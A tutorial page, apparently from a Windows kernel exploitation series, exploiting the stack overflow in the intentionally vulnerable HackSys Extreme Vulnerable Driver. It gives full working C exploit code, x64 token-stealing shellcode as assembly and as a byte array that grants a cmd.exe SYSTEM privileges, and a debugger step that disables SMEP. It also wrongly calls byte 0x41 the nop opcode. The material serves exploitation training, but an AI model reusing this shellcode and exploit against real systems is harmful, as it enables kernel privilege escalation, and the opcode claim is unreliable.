@@ -1,0 +1,778 @@
+---
+title: '2: Stack Overflow'
+series: 'WinExp1'
+---
+
+# <%= current_page.data.title %>
+
+## Intro
+
+This episode introduces the HEVD ([HackSys Extreme Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)) by solving it't first vulnerability: a generic [stack overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow). A stackoverflow vulnerability basically means user supplied input is copied into a variable and thereby onto the stack without checking the allowed size. This will overwrite everything else on the stack and eventually the instruction pointer allowing the exploiter (= us) to redirect code execution somewhere else. Since the driver, like everything else inside kernel space runs with full system privileges we can get a nice privilege escalation from user to NT-System.
+
+I will cut quite a few corners during this episode to keep things simple. Once you ran your exploit, feel free to try and understand what is happening left and right of the given path.
+
+## HEVD Source
+
+If you like a challenge you can examine the HEVD in Ida or even Windbg, if you are new to windows kernel drivers and exploiting it is probably best to look at the c source code at github. It's not very complicated as far as drivers go, but it isn't exactly simple either.
+
+<% note('Exercise') do %>
+Find out how the HEVD works an how it can be exploited.
+<%end%>
+
+<% spoiler('Solution') do %>
+
+The main file is [HackSysExtremeVulnerableDriver.c](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HackSysExtremeVulnerableDriver.c). It contains a 'DriverEntry' function, the equivalent of main() for windows drivers. The important parts are sort of like this:
+
+```cpp
+
+NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {
+	// Create a device object
+	// Each driver manages one or several physical or logical devices
+	IoCreateDevice(...)
+
+	// Register DEVICE_CONTROL Irp handler
+	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceIoCtlHandler;
+
+	// Create Symbolink link
+	IoCreateSymbolicLink(&DosDeviceName, &DeviceName);
+}
+
+NTSTATUS IrpDeviceIoCtlHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
+	// handle IRPs
+
+	 if (IrpSp) {
+        switch (IoControlCode) {
+            case HACKSYS_EVD_IOCTL_STACK_OVERFLOW:
+                DbgPrint("****** HACKSYS_EVD_STACKOVERFLOW ******\n");
+                Status = StackOverflowIoctlHandler(Irp, IrpSp);
+                DbgPrint("****** HACKSYS_EVD_STACKOVERFLOW ******\n");
+                break;
+    //...
+}
+
+```
+
+The driver create a logical device object that is needed to handle the I/O operations. The actual driver I/O is sent as IRPs - I/O request packets. Since the HEVD driver isn't actually doing anything it only handles OPEN, CLOSE and DEVICE_CONTROL IRPs. The DEVICE_CONTROL IRPs are a special kind of IRP, also called IOCTL - Device Input and Output Control - that can be used by user mode applications to communicate with a driver. The HEVD handles several different IO control codes (defined in the header file [HackSysExtremeVulnerableDriver.h](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HackSysExtremeVulnerableDriver.h), each representing a different vulnerability.
+
+So.. all we have to do is create a user mode application that creates one of those IOCTL thingies in a way that triggers the vulnerability.
+
+<% end %> 
+
+
+
+## Basic driver communicator source code
+
+The following is the source code for a basic usermode to driver communication tool adapted to talk to the HEVD via the StackOverflow IOCTL:
+
+```cpp
+#include <windows.h>
+#include <stdio.h>
+ 
+ 
+#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
+const char UserlandPath[] = "\\\\.\\HackSysExtremeVulnerableDriver";
+ 
+ 
+HANDLE getDeviceHandle(const char *path) {
+
+	HANDLE deviceHandle = CreateFileA (
+	path,					// path to device file
+	GENERIC_READ | GENERIC_WRITE,   // access rights
+	0,								// swShareMode (0 = not shared)
+	NULL,							// lpSecurityAttributes
+	OPEN_EXISTING,					// fails if doesn't exist
+	FILE_ATTRIBUTE_NORMAL,			// file has no attributes
+	NULL							// hTemplateFile (attribute templates)
+	);
+ 
+	if (deviceHandle == INVALID_HANDLE_VALUE) {
+		printf("[getDeviceHandle]: Device handle to %s not valid\n", path);
+	} else
+		printf("[getDeviceHandle]: Device handle to %s aquired!\n", path);
+ 
+	return(deviceHandle);
+}
+ 
+int DriverIO(HANDLE DeviceHandle, unsigned long IOCTL, unsigned long BufferSize, char *inBuffer, char *outBuffer) {
+ 
+	BOOL status = FALSE;
+	unsigned long bytesRead = 0;
+ 
+	status = DeviceIoControl (
+		DeviceHandle,										//
+		IOCTL,												//
+		(LPVOID)inBuffer,		
+		BufferSize,
+		(LPVOID)outBuffer,
+		BufferSize,
+		&bytesRead,
+		NULL       											//LPOVERLAPPED
+	);
+ 
+	if(status == FALSE) {
+		printf("[Test]: DeviceIoControl() failed\n");
+		return -1;
+	}
+ 
+	printf("[Test]: bytesRead=%d\n", bytesRead);
+	printf("[Test]: outBuffer=%s\n", outBuffer);
+ 
+	return(0);
+}
+ 
+int main()
+{
+	printf("HEVD Stack Overflow\n\n");
+ 
+	HANDLE deviceHandle = getDeviceHandle(UserlandPath);
+	if (deviceHandle == INVALID_HANDLE_VALUE)
+		return -1;
+ 
+	const int bufferSize = 64;
+ 
+	char inBuffer[bufferSize], outBuffer[bufferSize];
+ 
+	sprintf(inBuffer, "This is the INPUT buffer");
+	sprintf(outBuffer, "This is the OUTPUT buffer");
+ 
+	int r = DriverIO(deviceHandle, (unsigned long)HACKSYS_EVD_IOCTL_STACK_OVERFLOW, bufferSize, inBuffer, outBuffer);
+ 
+	return r;
+}
+```
+
+It looks like a lot of code, but that's mostly because I like to spread out the function parameters to make them easier to comment and edit. It's really just: get a handle on the HEVD device, prepare an input and output buffer and send them to the HEVD Driver with the STACK_OVERFLOW control code. Compile with Mingw 'gcc stackoverflow.c -o stackoverflow' and you are set.
+
+If you run the code nothing really interesting happens, no crash and the output buffer will be empty. That is because we just sent a few bytes and at least the StackOverflow module will not send us anything back.
+
+## Let's exploit!
+
+It should be clear what we have to do next (otherwise please read up on the topic of stack overflow before you continue). Delete the outBuffer parts if you want, and then prepare an inputBuffer to sent a lot of bytes to the driver. We can send whatever we want, but traditionaly the byte '0x41' is used. It is x86/AMD64 bytecode for the 'nop' (no-) operation that does absolutely nothing and has special use in certain exploit situations (not this one).
+
+<% spoiler('Code Snippet') do %>
+
+``` cpp
+const int bufferSize = 4096;
+char myBuffer[bufferSize];
+memset(myBuffer, 0x41, 4096);
+```
+<% end %>
+
+<% spoiler('Complete Code') do %>
+
+``` cpp
+#include <windows.h>
+#include <stdio.h>
+ 
+ 
+#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
+const char UserlandPath[] = "\\\\.\\HackSysExtremeVulnerableDriver";
+ 
+ 
+HANDLE getDeviceHandle(const char *path) {
+ 
+	HANDLE deviceHandle = CreateFileA
+	(
+	path,							// path to device file
+	GENERIC_READ | GENERIC_WRITE,   // access rights
+	0,								// swShareMode (0 = not shared)
+	NULL,							// lpSecurityAttributes
+	OPEN_EXISTING,					// fails if doesn't exist
+	FILE_ATTRIBUTE_NORMAL,			// file has no attributes
+	NULL							// hTemplateFile (attribute templates)
+	);
+ 
+	if (deviceHandle == INVALID_HANDLE_VALUE) {
+		printf("[getDeviceHandle]: Device handle to %s not valid\n", path);
+	} else
+		printf("[getDeviceHandle]: Device handle to %s aquired!\n", path);
+ 
+	return(deviceHandle);
+}
+ 
+ 
+int DriverIO(HANDLE DeviceHandle, unsigned long IOCTL, char *inBuffer, size_t inBufferSize) {
+ 
+	BOOL status = FALSE;
+ 
+	status = DeviceIoControl (
+		DeviceHandle,					//
+		IOCTL,							//
+		(LPVOID)inBuffer,		
+		inBufferSize,
+		NULL,							// in buffer
+		0,								// out buffer size
+		NULL,							// *bytes read
+		NULL       						// LPOVERLAPPED
+	);
+ 
+	if(status == FALSE) {
+		printf("[DriverIO]: DeviceIoControl() failed\n");
+		return -1;
+	} else
+		printf("[DriverIO]: buffer written\n");
+ 
+	return(0);
+}
+ 
+int main()
+{
+	printf("HEVD Stack Overflow\n\n");
+ 
+	HANDLE deviceHandle = getDeviceHandle(UserlandPath);
+	if (deviceHandle == INVALID_HANDLE_VALUE)
+		return -1;
+ 
+	const int bufferSize = 4096;
+	char myBuffer[bufferSize];
+	memset(myBuffer, 0x41, 4096);
+ 
+	int r = DriverIO(deviceHandle, (unsigned long)HACKSYS_EVD_IOCTL_STACK_OVERFLOW, myBuffer, sizeof(myBuffer));
+ 
+	return r;
+}
+```
+<% end %>
+
+Before you execute that code you should prepare your lab. The best preparation cycle is:
+  1. Shut down and start the debugee
+  2. Launch Windbg on the debugger to see if it working then close Windbg
+  3. Prepare to load the HEVD on the debugger and compile/prepare/copy your test/exploit code
+  4. Create a VM snapshot of the debugee
+  5. Load the HEVD driver
+  6. Launch Windbg on the debbuger, '.reload' to get the HEVD symbols and create breakpoints if needed
+  7. Launch test/exploit 
+
+This way after your test or exploited ran and you restore your snapshot you have a very good chance that everything works as before. Having the HEV driver loaded or Windbg open while creating the Snapshot will decrease your chances of everything going smoothly. Avoid touching anything after creating the snapshot. Doing things like create snapshot -> do minor code change -> compile -> run -> crash -> revert to snapshot will get you in trouble eventually. 
+
+Once you are set execute your exploit. And if everything went as it should your debugee should crash.
+
+
+<%= img_frame('img/hevd_stackoverflow_1st_crash.png','First StackOverflow crash.') %>
+
+If you have some prior experience with stack overflows everything should be familiar. If not, read my recap on
+
+
+<% spoiler('What exactly happened?') do %>
+On assembly/processor level a function is called with a 'call <function address>' instruction. The call instruction pushes the address of the next instruction, the 'return address' onto the stack and changes the instruction pointer to the function address, thereby diverting execution into the function. At the end of the function a 'ret' instruction will do the reverse: pop the 'return address from the stack and change the instruction pointer to that address, therby continuing execution right after the original 'call'. 
+So far so good. Inside the function the compiler (that compiled the HEVD driver) stored the local variables. And the vulnerable TriggerStackOverflow function copied the 4096 (or however many) bytes we sent via the IOCTL into a buffer that was supposed to be 512 bytes large. All the bytes beyond 512 overwrote the other local variables, the compilers safety margin and finally the return address. So when 'ret' tried to divert execution it tried to do so to whatever we put into the buffer at that point (0x41414141.. im my case) which resulted in an access violation.
+
+<% end %>
+
+
+The next step is by the book StackOverflow Exploitation. We don't want to crash the system, we want to divert execution. To do that we have to find out exactly which part of our buffer ended up in the function return address. We do that by writing a pattern onto the stack and checking which part of the pattern 'ret' tried to return to.
+
+You can do this by yourself or just grab a pattern creator off the internet. I used the [Python Exploit Pattern Tool](https://github.com/Svenito/exploit-pattern/blob/master/pattern.py). If you have a kali installation at hand you can also use the pattern creator built into metasploit.  
+
+```
+C:\HEVD\stackoverflow>python pattern.py 1024
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A...
+```
+
+``` cpp
+
+	char myBuffer[4096] = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5A..."
+
+```
+
+Compile -> Prepare Lab -> Run
+
+The debugee should crash once again, this time with a stack full of strange numbers
+
+``` cppp
+Access violation - code c0000005 (!!! second chance !!!)
+HEVD!TriggerStackOverflow+0xc8:
+fffff801`c12a5708 c3              ret
+kd> k
+ # Child-SP          RetAddr           Call Site
+00 ffffdc82`7a7e7718 37714336`71433571 HEVD!TriggerStackOverflow+0xc8 [c:\hacksysextremevulnerabledriver\driver\stackoverflow.c @ 101] 
+01 ffffdc82`7a7e7720 72433971`43387143 0x37714336`71433571
+02 ffffdc82`7a7e7728 43327243`31724330 0x72433971`43387143
+03 ffffdc82`7a7e7730 35724334`72433372 0x43327243`31724330
+04 ffffdc82`7a7e7738 72433772`43367243 0x35724334`72433372
+05 ffffdc82`7a7e7740 43307343`39724338 0x72433772`43367243
+06 ffffdc82`7a7e7748 33734332`73433173 0x43307343`39724338
+07 ffffdc82`7a7e7750 73433573`43347343 0x33734332`73433173
+...
+```
+
+What we need is the pattern value right on top of the stack 
+
+```
+kd> dp @rsp L1
+ffffdc82`7a7e7718  37714336`71433571
+
+C:\HEVD\stackoverflow>python pattern.py "0x3771433671433571"
+Pattern 0x3771433671433571 first occurrence at position 2056 in pattern.
+```
+
+Your stack may also look like this:
+
+``` cppp
+A fatal system error has occurred.
+...
+kd> k
+ # Child-SP          RetAddr           Call Site
+00 ffffdc82`7a7e4f58 fffff801`bec06782 nt!DbgBreakPointWithStatus
+01 ffffdc82`7a7e4f60 fffff801`bec06007 nt!KiBugCheckDebugBreak+0x12
+02 ffffdc82`7a7e4fc0 fffff801`beb6b1e7 nt!KeBugCheck2+0x937
+03 ffffdc82`7a7e56e0 fffff801`bec055a1 nt!KeBugCheckEx+0x107
+04 ffffdc82`7a7e5720 fffff801`beb7188d nt!KiInterruptHandler+0x21
+05 ffffdc82`7a7e5760 fffff801`bea21d60 nt!RtlpExecuteHandlerForException+0xd
+06 ffffdc82`7a7e5790 fffff801`bea228e4 nt!RtlDispatchException+0x430
+07 ffffdc82`7a7e5e80 fffff801`beb76ace nt!KiDispatchException+0x144
+08 ffffdc82`7a7e6530 fffff801`beb74b34 nt!KiExceptionDispatch+0xce
+09 ffffdc82`7a7e6710 fffff801`beb704a2 nt!KiGeneralProtectionFault+0xf4
+0a ffffdc82`7a7e68a0 fffff801`beb701f2 nt!SwapContext+0x212
+0b ffffdc82`7a7e68e0 fffff801`beb6eac5 nt!KxDispatchInterrupt+0x122
+0c ffffdc82`7a7e6a20 fffff801`beb6c8c1 nt!KiDpcInterruptBypass+0x25
+0d ffffdc82`7a7e6a30 fffff801`bec09b79 nt!KiInterruptDispatch+0xb1
+0e ffffdc82`7a7e6bc0 fffff801`bf194e01 nt!KeThawExecution+0xcd
+0f ffffdc82`7a7e6bf0 fffff801`bec02380 nt!KdExitDebugger+0x8d
+10 ffffdc82`7a7e6c20 fffff801`bf1982f5 nt!KdpReport+0xd8
+11 ffffdc82`7a7e6c60 fffff801`bea22ce0 nt!KdpTrap+0x14d
+12 ffffdc82`7a7e6cb0 fffff801`beb850ab nt!KdTrap+0x2c
+13 ffffdc82`7a7e6cf0 fffff801`beb76ace nt!KiDispatchException+0x16290b
+14 ffffdc82`7a7e73a0 fffff801`beb74b34 nt!KiExceptionDispatch+0xce
+15 ffffdc82`7a7e7580 fffff801`c12a5708 nt!KiGeneralProtectionFault+0xf4
+16 ffffdc82`7a7e7718 37714336`71433571 HEVD!TriggerStackOverflow+0xc8 [c:\hacksysextremevulnerabledriver\driver\stackoverflow.c @ 101] 
+17 ffffdc82`7a7e7720 72433971`43387143 0x37714336`71433571
+```
+
+In this case Windbg didn't give you a "second chance", but instead the system ran right into the acces violation and triggered a bunch of Bugcheck functions that are now cluttering the stack. But as you can see the pattern is still on the stack, right after the first exception handler 'nt!KiGeneralProtectionFault+0xf4'. 
+
+
+## To the exploit!
+
+We need to do two things now. First we need to adjust our code to put a meaningful address at position 2056 and then we have to write the code that is supposed to be executed once we hijacked the execution flow.
+
+The first part is easy. At least if you are deeply into c programming. Otherwise just believe me that this will work:
+
+``` cpp
+
+	const int bufferSize = 2064;
+	char myBuffer[2064];
+	memset(myBuffer, 0x41, 2056);
+	*(unsigned long long *)(myBuffer + 2056) = (unsigned long long)shellcode;
+```
+
+Define the buffer, fill with '0x41' bytes and write the address of "shellcode" to position 2056. If you know what shellcode is go ahead and write some, otherwise
+
+<% spoiler('Lets recap') do %>
+
+With what we did so far we can hijack the processor while it belives it is running a system driver. Whatever we make the processor execute will run with ring 0 aka full system privileges. But it will also run completely on it's own - no standard libraries, no libraries at all, nothing! So if you just compile some c++ code and let it be executed using the exploit it will fail miserably because it will expect certain dlls to be present that won't be there. 
+What we need instead is sometimes called "position independent code" it can be either 
+  1. A very simple piece of code that doesn't require any library calls
+  2. A rather complicated piece of code that finds all relevant library addresses by itself
+Of course we will go for option 1, at least for now. And the simplest way to program is assembly language so let's use that.
+
+
+<% end %>
+
+## Launching a shell
+
+
+It's called shellcode because it's main 'historic' use is starting a shell. It still is in many cases (remote execution etc.) but in our case it isn't. 
+We can start a cmd.exe from our user mode code. What we need the shellcode to do is to elevate the privileges of that cmd shell (you could also elevate the privileges of the shell you opened to run you exploit but starting a new one makes it easier to identify the correct cmd.exe to elevate).
+
+So let's spawn a shell really quick and get its process identifier:  
+
+``` cpp
+
+STARTUPINFOA si;
+PROCESS_INFORMATION pi;
+ 
+ZeroMemory(&si, sizeof(STARTUPINFO));
+ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+si.cb = sizeof(STARTUPINFOA);
+ 
+if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+	printf("[Duh!]: Error creating cmd.exe\n");
+	return -1;
+}
+DWORD cmd_pid = pi.dwProcessId;
+```
+
+### Playing around with cmd.exe
+
+If you are unsure what we are trying to accomplish here check the difference between a user and an elevated (admin) command prompt:
+
+<%= img_frame('img/stackoverflow_cmd_test.png','Normal vs administrative command prompt') %>
+
+
+## The shellcode
+
+Our shellcode has to do what I described in the [../../WinReverseEng/processes](Processes Episode) of the Windows Reverse Engineering tutorials from a Windbg perspective.
+
+1. Find the active process List
+2. Find the system process and our cmd.exe
+3. Replace the security token of the cmd.exe by the system process token
+
+To make things easier we will use a shortcut to the KTHREAD object ob the currently running thread, it is stored in gs:0x188.
+
+``` cp
+kd> dps gs:188 l1
+002b:00000000`00000188  fffff801`bee1b380 nt!KiInitialThread
+
+kd> dt nt!_KTHREAD <KTHREAD Address>
+...
++0x220 Process          : <KPROCESS Address> _KPROCESS
+```
+
+Translated into assembly language:
+
+``` asm
+
+mov rax, [gs:0x188]  		; KTHREAD
+mov rax, [rax + 0x220]		; EPROCESS
+```
+
+Next: find system process by looping through the active process list to find process id 4:
+
+``` cp
+
+kd> dt nt!_EPROCESS
+   +0x000 Pcb              : _KPROCESS
+   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
+   +0x2e0 UniqueProcessId  : Ptr64 Void
+   +0x2e8 ActiveProcessLinks : _LIST_ENTRY
+   +0x358 Token            : _EX_FAST_REF
+```
+
+``` asm
+
+system_search_loop:
+	mov rax, [rax + 0x2e8]		; ActiveProcessLinks-> Flink
+	sub rax, 0x2e8
+	cmp [rax + 0x2e0], dword 4
+	jne system_search_loop
+	mov rcx, [rax +0x358]		; system token @rcx
+
+```
+
+In the next part we are looking for the PIL of our cmd.exe. Since we don't know that yet, we will use '0x41414141' as a placeholder
+
+``` asm
+cmd_search_loop:
+	mov rax, [rax + 0x2e8]		; ActiveProcessLinks-> Flink
+	sub rax, 0x2e8						
+	cmp [rax + 0x2e0], dword 0x41414141	; insert cmd.exe PID @0x41414141
+	jne cmd_search_loop
+	mov [rax+0x358], rcx 		; system token @cmd.exe
+```
+
+<% spoiler('Final nasm code') do %>
+
+``` asm
+
+bits 64 
+section .text
+global _start
+ 
+push rax
+push rbx
+push rcx
+push rsi
+push rdi
+ 
+_start:
+	mov rax, [gs:0x188]  		; KTHREAD
+	mov rax, [rax + 0x220]		; EPROCESS
+system_search_loop:
+	mov rax, [rax + 0x2e8]		; ActiveProcessLinks-> Flink
+	sub rax, 0x2e8
+	cmp [rax + 0x2e0], dword 4
+	jne system_search_loop
+	mov rcx, [rax +0x358]		; system token @rcx
+cmd_search_loop:
+	mov rax, [rax + 0x2e8]		; ActiveProcessLinks-> Flink
+	sub rax, 0x2e8						
+	cmp [rax + 0x2e0], dword 0x41414141	; insert cmd.exe PID @0x41414141
+	jne cmd_search_loop
+	mov [rax+0x358], rcx 		; system token @cmd.exe
+	 
+pop rdi
+pop rsi
+pop rcx
+pop rbx
+pop rax
+ret
+```
+
+<% end %>
+
+There are several ways to get the raw bytecode we need as shellcode. Using nasm '-f bin' creates a flat binary file which is exaclty what we need. 
+
+```
+nasm token1.asm -o token1.bin -f bin
+```
+
+If you open this in the HxD Hex Editor you can use it's nice helper to convert this into a c style array:
+<%= img_frame('img/stackoverflow_hxd_shellcode.png','HxD to extract the shellcode') %>
+
+If you have aversions against using a gui application for this you can use radar2 for instance to create something similar:
+
+```
+radare2 -b 64 -c pc ./token1.bin
+```
+
+HxD has another useful benefit. It makes it dead simple to find the offset between the shellcode beginning and the 0x4141.. placeholder where we need to put the corred cmd.exe PID. Switch the Offset Base to decimal first.
+
+<%= img_frame('img/stackoverflow_hxd_offset.png','The offset is hidden in the bottom left corner.') %>
+
+
+Back to our the exploit code:
+
+``` cpp
+//*(DWORD *)((char *)shellcode + <offset>) = cmd_pid;
+*(DWORD *)((char *)shellcode + 69) = cmd_pid;
+```
+
+## Run the exploit
+
+### Problem 1
+
+If you execute our exploit windows should run into a KERNEL_SECURITY_CHECK_FAILURE (139). Meaning our exploit has some problems (three actually). The reason for the System Crash is a security feature called Data Execution Prevention (DEP). Our shellcode is sitting in a memory page flagged as 'data' and isn't allowed to be executed as code. It's pretty simple to circumvent, we only need to tell windows that we want that memory page to be executable:
+
+
+``` cpp
+
+	VirtualProtect(shellcode, 256, PAGE_EXECUTE_READWRITE, &oldProtect);
+```
+
+### Problem 2
+
+After fixing DEP VmWare workstation machines will crash with 'ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY'. This is because of another security feature calles 'Supervisor mode execution prevention (SMEP)'. The kernel is not allowed to execute code in user space. Since our shellcode is sitting in user space and we can't access kernel memory until after we gained control we are screwed. There are ways around this but for now I recommend cheating and disabling SMEP from the Debugger:
+
+``` cp
+
+# SMEP is controled by bit 20 inside the cr4 register:
+
+# Check if cr4 bit 20 is actually set:
+r cr4
+.formats cr4
+? (@cr4 and (1 << 0n20))
+
+# MASM doesn't have a bitwise not, so we'll use c to clear bit 20:
+r cr4 = @@(@cr4 & ~(1<<20))
+```
+
+### Problem 3
+
+The next crash is because of an error in my assembly code. It is supposed to be a barrier to just blindly copy pasting my code.
+
+<% note('Exercise') do %>
+Find out why or at least where our exploit crashes.
+<%end%>
+
+<% spoiler('Hints') do %>
+
+In the debugger use 'bp HEVD!TriggerStackOverflow' to create a breakpoint before the vulnerable code. If you ran the exploit and reached the breakpoint you can use 'pt' to go to the next return instuction. The return instruction where the exploiting is supposed to happen. With 'u poi(rsp)' you should see the shellcode. If not something is fundamentally wrong. If you see the shellcode go through is instruction by instruction (it's not that much after all) until you find the problem.
+
+<% end %>
+
+
+
+<% spoiler('Solution') do %>
+
+If you did everything according to plan (or copied my code) the system should crash at the final 'return' instruction of our shellcode. And if you think about it for a moment: why should it not? We can't return from 'TriggerStackOverflow' because we overwrote the return address with the address of our shellcode. It is gone. Our best hope to return into the normal flow of execution is to return from the next function on the call stack. In this case 'IrpDeviceIoCtlHandler'
+
+Lucky for us the IrpDeviceIoCtlHandler does nothing of importance after calling the TriggerStackOverflow function. All we have to do is adjust the stack pointer so it point to the correct return address. If you dissassemble the 'IrpDeviceIoCtlHandler' (best done in Ida/free) or follow the correct flow of execution in Windbg you can find out that only the stack pointer is only used in two instructions after calling 'TriggerStackOverflow':
+
+``` asm
+
+add     rsp, 20h
+pop     rdi
+
+```
+
+That means if we simply add 28h to the stack pointer at the end of our shellcode we should return to whatever called the IrpDeviceIoCtlHandler.
+
+``` asm
+
+...
+pop	rax
+add rsp, 0x28
+ret
+```
+
+<% end %>
+
+If the exploit was succesful you get a new cmd shell that will run with NT System privileges.
+
+<%= img_frame('img/stackoverflow_cmd_exploit.png','Succesful exploit.') %>
+
+
+
+<% spoiler('Full exploit code') do %>
+
+``` asm
+bits 64 
+section .text
+global _start
+ 
+push rax
+push rbx
+push rcx
+push rsi
+push rdi
+ 
+_start:
+	mov rcx, 0xC0000101  		
+	rdmsr
+	mov ebx, eax
+	mov eax, edx
+	shl rax, 32
+	or	rax, rbx
+	mov rax, [rax + 0x188]	; KPCR+KPCRB+KTHREAD
+	mov rax, [rax + 0x220]		; EPROCESS
+system_search_loop:
+	mov rax, [rax + 0x2e8]		; ActiveProcessLinks-> Flink
+	sub rax, 0x2e8
+	cmp [rax + 0x2e0], dword 4
+	jne system_search_loop
+	mov rcx, [rax +0x358]		; system token @rcx
+cmd_search_loop:
+	mov rax, [rax + 0x2e8]		; ActiveProcessLinks-> Flink
+	sub rax, 0x2e8						
+	cmp [rax + 0x2e0], dword 0x41414141	; insert cmd.exe PID @0x41414141
+	jne cmd_search_loop
+	mov [rax+0x358], rcx 		; system token @cmd.exe
+ 
+pop rdi
+pop rsi
+pop rcx
+pop rbx
+pop rax
+add rsp, 0x28
+ret
+```
+
+``` cpp
+#include <windows.h>
+#include <stdio.h>
+ 
+ 
+#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
+const char UserlandPath[] = "\\\\.\\HackSysExtremeVulnerableDriver";
+ 
+/* C:\_c\Code\HEVD_dev\stackoverflow\token1.bin (12/9/2018 3:42:16 AM)
+   StartOffset(d): 00000000, EndOffset(d): 00000091, Length(d): 00000092 */
+
+unsigned char shellcode[92] = {
+	0x50, 0x53, 0x51, 0x56, 0x57, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01,
+	0x00, 0x00, 0x48, 0x8B, 0x80, 0x20, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x80,
+	0xE8, 0x02, 0x00, 0x00, 0x48, 0x2D, 0xE8, 0x02, 0x00, 0x00, 0x83, 0xB8,
+	0xE0, 0x02, 0x00, 0x00, 0x04, 0x75, 0xEA, 0x48, 0x8B, 0x88, 0x58, 0x03,
+	0x00, 0x00, 0x48, 0x8B, 0x80, 0xE8, 0x02, 0x00, 0x00, 0x48, 0x2D, 0xE8,
+	0x02, 0x00, 0x00, 0x81, 0xB8, 0xE0, 0x02, 0x00, 0x00, 0x41, 0x41, 0x41,
+	0x41, 0x75, 0xE7, 0x48, 0x89, 0x88, 0x58, 0x03, 0x00, 0x00, 0x5F, 0x5E,
+	0x59, 0x5B, 0x58, 0x48, 0x83, 0xC4, 0x28, 0xC3
+};
+
+
+//0x41 starts at offset 69
+ 
+HANDLE getDeviceHandle(const char *path) {
+ 
+	HANDLE deviceHandle = CreateFileA
+	(
+	path,							// path to device file
+	GENERIC_READ | GENERIC_WRITE,   // access rights
+	0,								// swShareMode (0 = not shared)
+	NULL,							// lpSecurityAttributes
+	OPEN_EXISTING,					// fails if it doesn't exist
+	FILE_ATTRIBUTE_NORMAL,			// file has no attributes
+	NULL							// hTemplateFile (attribute templates)
+	);
+ 
+	if (deviceHandle == INVALID_HANDLE_VALUE) {
+		printf("[getDeviceHandle]: Device handle to %s not valid\n", path);
+	} else
+		printf("[getDeviceHandle]: Device handle to %s aquired!\n", path);
+ 
+	return(deviceHandle);
+}
+ 
+ 
+int DriverIO(HANDLE DeviceHandle, unsigned long IOCTL, char *inBuffer, size_t inBufferSize) {
+ 
+	BOOL status = FALSE;
+ 
+	status = DeviceIoControl (
+		DeviceHandle,										//
+		IOCTL,	//
+		(LPVOID)inBuffer,		
+		inBufferSize,
+		NULL,												// in buffer
+		0,													// out buffer size
+		NULL,												// *bytes read
+		NULL       											// LPOVERLAPPED
+	);
+ 
+	if(status == FALSE) {
+		printf("[DriverIO]: DeviceIoControl() failed\n");
+		return -1;
+	} else
+		printf("[DriverIO]: buffer written\n");
+ 
+	return(0);
+}
+ 
+DWORD spawnCMD() {
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
+ 
+	ZeroMemory(&si, sizeof(STARTUPINFO));
+	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+ 
+	si.cb = sizeof(STARTUPINFOA);
+	if (!CreateProcessA(
+		NULL, 
+		"cmd.exe",
+		NULL, 
+		NULL, 
+		TRUE, 
+		CREATE_NEW_CONSOLE, 
+		NULL, 
+		NULL, 
+		&si, 
+		&pi
+	)) {
+		printf("[!] FATAL: Error spawning cmd.exe\n");
+		return -1;
+	}
+	return pi.dwProcessId;
+}
+ 
+int main()
+{
+	DWORD oldProtect;	
+ 
+	printf("HEVD Stack Overflow\n\n");
+ 
+	HANDLE deviceHandle = getDeviceHandle(UserlandPath);
+	if (deviceHandle == INVALID_HANDLE_VALUE)
+		return -1;
+ 
+	DWORD cmd_pid = spawnCMD();
+	if (cmd_pid == -1)
+		return -1;
+	printf("CMD pid 0x%16x\n", cmd_pid);
+	*(DWORD *)((char *)shellcode + 69) = cmd_pid;
+ 
+	const int bufferSize = 2064;
+	char myBuffer[2064];
+	memset(myBuffer, 0x41, 2056);
+	*(unsigned long long *)(myBuffer + 2056) = (unsigned long long)shellcode;
+	VirtualProtect(shellcode, 256, PAGE_EXECUTE_READWRITE, &oldProtect);
+ 
+	int r = DriverIO(deviceHandle, (unsigned long)HACKSYS_EVD_IOCTL_STACK_OVERFLOW, myBuffer, sizeof(myBuffer));
+ 
+	return r;
+}
+
+```
+
+
+<% end %>
